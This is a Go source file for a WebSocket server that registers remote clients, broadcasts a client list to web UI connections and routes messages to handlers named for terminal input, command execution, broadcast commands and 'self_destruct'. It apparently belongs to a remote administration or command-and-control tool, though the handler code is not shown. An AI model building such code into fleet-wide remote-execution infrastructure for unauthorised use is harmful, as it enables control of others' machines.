package server

import (
	"log"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// Server manages WebSocket connections and message routing
type Server struct {
	clients       map[string]*Client
	clientsMu     sync.RWMutex
	uiConnections []*UIConnection
	uiConnMu      sync.RWMutex
	broadcast     chan []byte
	register      chan *Client
	unregister    chan *Client
	handlers      map[string]MessageHandler
}

// NewServer creates a new server instance
func NewServer() *Server {
	s := &Server{
		clients:       make(map[string]*Client),
		uiConnections: make([]*UIConnection, 0),
		broadcast:     make(chan []byte, 256),
		register:      make(chan *Client),
		unregister:    make(chan *Client),
		handlers:      make(map[string]MessageHandler),
	}
	
	// Register message handlers
	s.handlers["terminal_input"] = &TerminalInputHandler{}
	s.handlers["terminal_resize"] = &TerminalResizeHandler{}
	s.handlers["execute_command"] = &ExecuteCommandHandler{}
	s.handlers["self_destruct"] = &SelfDestructHandler{}
	s.handlers["broadcast_command"] = &BroadcastCommandHandler{}
	
	return s
}

// Run starts the server's main event loop
func (s *Server) Run() {
	for {
		select {
		case client := <-s.register:
			s.clientsMu.Lock()
			s.clients[client.ID] = client
			s.clientsMu.Unlock()
			log.Printf("Client connected: %s", client.ID)
			s.broadcastClientList()

		case client := <-s.unregister:
			s.clientsMu.Lock()
			if _, ok := s.clients[client.ID]; ok {
				delete(s.clients, client.ID)
				client.Conn.Close()
			}
			s.clientsMu.Unlock()
			log.Printf("Client disconnected: %s", client.ID)
			s.broadcastClientList()

		case message := <-s.broadcast:
			// Send to web UI connections only, removing dead connections
			s.uiConnMu.Lock()
			validConnections := make([]*UIConnection, 0, len(s.uiConnections))
			for _, uiConn := range s.uiConnections {
				uiConn.mu.Lock()
				err := uiConn.Conn.WriteMessage(websocket.TextMessage, message)
				uiConn.mu.Unlock()
				if err != nil {
					log.Printf("Error broadcasting to UI, removing dead connection: %v", err)
					uiConn.Conn.Close()
				} else {
					validConnections = append(validConnections, uiConn)
				}
			}
			s.uiConnections = validConnections
			s.uiConnMu.Unlock()
		}
	}
}

// broadcastClientList sends the current client list to all UI connections
func (s *Server) broadcastClientList() {
	s.clientsMu.RLock()
	clientList := make([]map[string]interface{}, 0, len(s.clients))
	for id, client := range s.clients {
		clientList = append(clientList, map[string]interface{}{
			"id":        id,
			"last_seen": client.LastSeen.Format(time.RFC3339),
		})
	}
	s.clientsMu.RUnlock()

	msg := map[string]interface{}{
		"type":      "client_list",
		"clients":   clientList,
		"timestamp": time.Now().Format(time.RFC3339),
	}
	msgJSON := safeMarshal(msg)
	if msgJSON == nil {
		return // Failed to marshal, skip broadcast
	}
	s.broadcast <- msgJSON
}

